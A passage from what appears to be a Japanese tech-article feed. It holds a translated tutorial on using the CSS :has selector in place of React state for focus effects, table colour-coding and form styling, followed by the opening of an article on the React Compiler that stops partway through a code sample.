<iframe src="https://codesandbox.io/embed/tmh8wk?codemirror=1&amp;hidedevtools=0&amp;view=preview" style="width:100%;height:500px;border:0;border-radius:4px" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<p>しかし、Reactアプリでこのようなことがしたいでしょうか。こうしたスタイルは、子セレクタと同様に要素の境界が曖昧になりがちです。ここ10年くらい、そうならないようにするための方法を色々と工夫して編み出してきたのではなかったでしょうか。BEM、SASS、CSS-in-JS、CSSモジュールなどなど。スタイルの適用範囲を意図した要素にのみ限定するために、私たちはあらゆる手段を講じます。</p>
<p>では、突如その流れに逆行し、あらゆるベストプラクティスと逆のことをする理由はどこにあるのでしょうか。もちろん、Reactでは数年置きにそうした傾向が見られるのはありますが😅</p>
<p>答えは、複雑なReactコードを不要にするためです。最高のReactコードは、Reactコードを一切使わないことである場合もあるのです。先ほどは極めて複雑なセレクタの例をお見せしましたが（まね 真似することはお勧めしません）、ReactをCSSに置き換えることでロジックを単純化することができ、若干パフォーマンスを改善できる場合もあります。</p>
<p>ではいくつか実例を見てみましょう。</p>
<h2>:hasセレクタと要素のフォーカス状態</h2>
<p>タスクボードを実装したいとします。ボード上には多数のカードがあり、各カードにはそれぞれ「開く」と「削除」の2つのボタンがあります。「開く」ボタンをクリックすると、カードの内容がすべてモーダル上に開きます。「削除」をクリックするとカードが削除されます。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example1-cards.png"></p>
<p>このカードのコードは非常にシンプルです。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  Some text here
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>buttons<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Open</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Delete</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Tabキーを使ってボタンに移動するなど、キーボードで操作可能にしたいと思います。さらに、キーボードユーザーの利便性を改善するため、どのボタンが選択されているかが分かるようにしたいと思います。ユーザーがTabキーを使っていずれかのボタンに移動したら、カードが少し「飛び出す」ようにし、同じ列の他のカードはグレーアウトさせます。さらに、アクティブ状態のカードの枠の色を変え、現在アクティブな操作が分かるようにしたいと思います。「削除」ボタンには赤、「開く」ボタンには緑を使用します。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example1-5-cards-highlighted.png"></p>
<p>Reactでこの機能を実装するには、focusイベントリスナーを追加し、現在アクティブなボタンを検知し、カード自体のclassNamesを変更できるようstateを維持し、他のカードも変更できるようそのstateをどうにかして親と共有する必要があります。そのためには、Contextなどの状態管理ソリューションを導入する必要があるでしょう。気が付けば、すべてのタブのすべてのカードを再レンダリングする本格的なフォーカスマネージャーを実装しなくてはならなくなっているでしょう。実際にこのような凝ったインタラクションを見かけないのも無理はありません。せいぜいボタンの輪郭線に一貫性をもたせることぐらいしか望めないでしょう。</p>
<p>しかし、<code class="language-text">:has</code>セレクタを使えば今述べたようなことも比較的簡単に実装できます。</p>
<p>ステップ1。<code class="language-text">className</code>に頼らなくても<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors">選択できる</a>よう、<code class="language-text">data-</code>属性をボタンに割り当てます。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// add data-action attributes to the buttons</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">data-action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>open<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Open</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">data-action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>delete<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Delete</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ステップ2。フォーカスされた「削除」ボタンを含むカードを見つけ、CSSを変えます。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// make the card "pop" and change its border colors
// if the "delete" button inside the card is focused
.card:has([data-action='delete']:focus-visible)</span> <span class="token punctuation">{</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #f7bccb<span class="token punctuation">;</span>
  <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 0 0 2px #f7bccb<span class="token punctuation">;</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>1.02<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ステップ3。フォーカスされた「開く」ボタンを含むカードを見つけ、CSSを変えます。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// make the card "pop" and change its border colors
// if the "open" button inside the card is focused
.card:has([data-action='open']:focus-visible)</span> <span class="token punctuation">{</span>
  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>1.02<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">border-top</span><span class="token punctuation">:</span> 10px solid #c3dccf<span class="token punctuation">;</span>
  <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0 0 0 2px #c3dccf<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ステップ4。これが一番難しい処理になります。フォーカスされた「開く」または「削除」ボタンを含むカードの「前後」のカードをすべて見つけ、グレーアウトする必要があります。魔法の種明かしはこちらです。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">// all cards after the card with focused "open" button
.card:has([data-action='open']:focus-visible) ~ .card,

// all cards after the card with focused "delete" button
.card:has([data-action='delete']:focus-visible) ~ .card,

// all cards before the card with focused "open" button
.card:has(~ .card [data-action='open']:focus-visible),

// all cards before the card with focused "delete" button
.card:has(~ .card [data-action='delete']:focus-visible)</span> <span class="token punctuation">{</span>
  <span class="token property">filter</span><span class="token punctuation">:</span> <span class="token function">greyscale</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token property">background-color</span><span class="token punctuation">:</span> #f6f7f6<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>JavaScriptもReactの再レンダリングも一切必要としない、どのボードよりも美しいキーボード操作を実現できました。以下の実例を触ってみてください。</p>
<p>in all the boards ever with zero JavaScript and zero React re-renders! A live example is below to play around with.</p></p>
<iframe src="https://codesandbox.io/embed/rdqj6x?codemirror=1&amp;hidedevtools=0&amp;view=preview" style="width:100%;height:500px;border:0;border-radius:4px" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<p>:hasセレクタとカテゴリ分け</p>
<p>もう一つ、<code class="language-text">:has</code>セレクタのユースケースとして筆者がシンプルで秀逸だと思うのが、データに基づいて要素を色分けできる点です。</p>
<p>例えば、ショップで販売している商品を記載した表を実装してみましょう。これらの商品は、特定のカテゴリに分類されます。オンラインショップで事務用品、衣類、馬を販売しているとしましょう。表にはいくつかの列があり、最もシンプルな形にまとめたものが以下になります。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example2-table.png"></p>
<p>これをコードにすると、以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token operator">...</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Socks</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Created by...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Inventory full</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      clothes
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>
<span class="token operator">...</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>では、表の左側境界線にカテゴリを示す色を付けることで、各行のカテゴリを色分けしたいと思います。また、在庫切れの商品については、行の背景を赤く色付けすることで目立たせたいと思います。これを実装したものが以下になります。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example3-table-colors.png"></p>
<p>Reactでは、propsを使用し、カテゴリや在庫に関する情報を少なくとも<code class="language-text">row</code>タグ、あるいは最初のセルに渡す必要があります。さらに、バリエーションごとにクラス名や、場合によっては内部コンポーネントを作成する必要があります。この例では、こうした複雑な処理は一切不要です。</p>
<p>では、一連の流れを見てみましょう。</p>
<p>ステップ1。情報を格納した<code class="language-text">data-</code>属性を、すでにその情報を持っているセルに追加します。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Socks</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Created by...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  &lt;!-- add data-inventory attribute here -->
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">data-inventory</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Inventory full</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
    &lt;!-- add data-category attribute here -->
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category<span class="token punctuation">"</span></span> <span class="token attr-name">data-category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clothes<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      clothes
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ステップ2。<code class="language-text">:has</code>を使用し、必要なカテゴリを色分けします。</p>
<p><code class="language-text">data-category</code>を持つ要素を含む行の最初のセルに、カテゴリによって異なる色の境界線を追加します。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.table tr:has([data-category='clothes']) td:first-child</span> <span class="token punctuation">{</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 6px solid #f7bccb<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.table tr:has([data-category='office']) td:first-child</span> <span class="token punctuation">{</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 6px solid #f4d592<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.table tr:has([data-category='animals']) td:first-child</span> <span class="token punctuation">{</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 6px solid #c4f4ff<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">data-inventory</code>の値が<code class="language-text">empty</code>の要素を含む行には、赤色の背景を追加します。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.table tr:has([data-inventory='empty'])</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> #f6d0ce<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>美しく色分けされた表の出来上がりです。この表で特に素晴らしいのが、動的な状態にあり頻繁に更新される属性であっても、行全体を再レンダリングして色を更新する必要がない点です。再レンダリングされるのは<code class="language-text">data-</code>属性を含むセルだけです。よりシンプルで洗練されたコードに加え、この点も若干パフォーマンスの向上に寄与する可能性があります。</p>
<p>以下のインタラクティブな例をご覧ください。</p>
<iframe src="https://codesandbox.io/embed/z432ww?codemirror=1&amp;hidedevtools=0&amp;view=preview" style="width:100%;height:500px;border:0;border-radius:4px" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<h2>:hasセレクタとフォーム</h2>
<p>次が今回紹介する<code class="language-text">:has</code>セレクタの最後のユースケースです。フォーム要素の状態に応じて要素のスタイリングを行うというものですが、これが大変効果的で筆者も非常に気に入っています。</p>
<p>例えば、入力を無効にできるフォームにおいて、入力欄のラベル表示や説明も視覚的に「無効」にすることができます。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example4-disabled-input.png"></p>
<p>このフォームを記述したコードが以下になります。</p>
<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldset</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">htmlFor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-name<span class="token punctuation">"</span></span> <span class="token attr-name">disabled</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Nadia<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Just your first name is fine<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldset</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldset</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">htmlFor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Email Address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-email<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>We don't accept gmail domains!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldset</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>CSSでは、stateが<code class="language-text">:disabled</code>の入力を含む<code class="language-text">fieldset</code>を指定し、<code class="language-text">label</code>要素と<code class="language-text">.description</code>要素のスタイリングを行います。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">fieldset:has(input:disabled) label,
fieldset:has(input:disabled) .description</span> <span class="token punctuation">{</span>
  <span class="token property">color</span><span class="token punctuation">:</span> #d6d6d6<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>もちろん、フォーカスも使用できます。入力がフォーカスされると左側に線が表示されるようにしたい場合、</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example5-focused-input.png"></p>
<p>次のようにするだけです。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">fieldset:has(input:focus-visible)</span> <span class="token punctuation">{</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 10px solid #c4f4ff<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>もしくは、チェックボックス付きのリストを実装する場合、チェックされた行を強調表示するには通常ならチェックボックスのstateを格納し、<code class="language-text">.active</code>クラスを作成しますが、こうした処理を行うことなく簡単に強調表示することが可能です。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example6-checkboxes.png"></p>
<p>必要なのはCSSセレクタだけです。</p>
<p>.list-with-checkboxes li:has(input:checked) {
background: rgba(196, 244, 255, 0.3);
}</p>
<p>こちらのライブプレビューをご覧ください。</p>
<iframe src="https://codesandbox.io/embed/m3dd7k?codemirror=1&amp;hidedevtools=0&amp;view=preview" style="width:100%;height:500px;border:0;border-radius:4px" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<hr>
<p>素晴らしいと思いませんか？お気に入りの<code class="language-text">:has</code>の使い方がある方は、ぜひコメントで共有してください！</p>
<p>もちろん、セレクタを使用してReactコードを単純化する方法は他にもたくさんあります。ここに挙げたのは、筆者が特に気に入っているごく一部の例にすぎません。<code class="language-text">:has</code>セレクタについてもっと学び、色んな実例を試してみたい方は、例が豊富で内容的にも良い記事を以下に挙げていますので、ぜひ参照してみてください。</p>
<ul>
<li><a href="https://ishadeed.com/article/css-has-parent-selector/">CSS :has Parent Selector</a></li>
<li><a href="https://www.smashingmagazine.com/2021/06/has-native-css-parent-selector/">Meet :has, A Native CSS Parent Selector (And More) — Smashing Magazine</a></li>
<li><a href="https://www.smashingmagazine.com/2023/01/level-up-css-skills-has-selector/">Level Up Your CSS Skills With The :has() Selector — Smashing Magazine</a></li>
<li><a href="https://webkit.org/blog/13096/css-has-pseudo-class/">Using :has() as a CSS Parent Selector and much more</a></li>
<li><a href="https://www.bram.us/2022/11/17/style-a-parent-element-based-on-its-number-of-children-using-css-has/">Style a parent element based on its number of children using CSS :has()</a></li>
</ul>
<p>ここ数年のCSSの進歩を考えると、5年後くらいにはReactが必要なくなっているかもしれません。🤯もしそうなれば面白いですね！</p>]]></content:encoded></item><item><title><![CDATA[React Compilerについて理解する]]></title><description><![CDATA[Reactのコアアーキテクチャは、与えられた関数（すなわちコンポーネント）を繰り返し呼び出します。この仕組みはReactのメンタルモデルを単純化し、その人気に一役を買いましたが、同時にパフォーマンス…]]></description><link>https://postd.cc/understanding-react-compiler/</link><guid isPermaLink="false">https://postd.cc/understanding-react-compiler/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[React]]></category><pubDate>Fri, 27 Sep 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>Reactのコアアーキテクチャは、与えられた関数（すなわちコンポーネント）を繰り返し呼び出します。この仕組みはReactのメンタルモデルを単純化し、その人気に一役を買いましたが、同時にパフォーマンスの問題が生じる原因にもなりました。関数のパフォーマンスコストが高いと、アプリの動作は総じて遅くなります。</p>
<p>開発者はReactにどの関数をいつ再実行するか手動で指示しなくてはならなかったため、パフォーマンスチューニングが悩みの種になっていました。Reactチームが最近リリースしたReact Compilerというツールは、コードを書き直すことにより、開発者が手動で行っていたパフォーマンスチューニングの作業を自動化します。</p>
<p>React Compilerはコードに何をするのでしょうか？裏ではどのような処理が行われるのでしょうか？使った方がいいのでしょうか？こうした疑問について詳しく見ていきたいと思います。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>Reactの内部実装について詳しく学び、完全で正確なメンタルモデルを得たい方は、<a href="https://understandingreact.com/">Understanding React</a>という筆者の新しいコースでReactのソースコードを掘り下げて説明していますので、ぜひチェックしてみてください。Reactの使用経験が豊富な開発者でも、内部実装の理解を深めることは大いに役立ちます。</p></div></div>
<h2>コンパイラ、トランスパイラ、オプティマイザ</h2>
<p>モダンJavaScriptのエコシステムでは、コンパイラ、トランスパイラ、オプティマイザという用語がよく聞かれます。これらは何でしょうか？</p>
<h3>トランスパイル</h3>
<p>トランスパイラとは、コードを解析し、同等の機能を持つコードを別のプログラミング言語で出力するか、調整を加えたコードを同じプログラミング言語で出力するプログラムです。</p>
<p>React開発者は何年も前からトランスパイラを使用し、JSXをJavaScriptエンジンが実際に実行するコードに変換してきました。JSXは、基本的にはネストされた関数のツリー（これらはネストされたオブジェクトツリーを構築）を作成するための省略記法です。</p>
<p>ネストされた関数を記述するのは面倒でミスが生じやすいため、JSXは開発者を大いに助けます。トランスパイラはJSXを解析し、関数に変換するために必要です。</p>
<p>例えば、JSXを使用して次のReactコードを記述したとします。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>読みやすさに配慮し、このブログ記事ではコードはすべて大幅に簡略化しています。</p></div></div>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Item</span></span> <span class="token attr-name">item</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>item<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Item</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> item <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token plain-text">
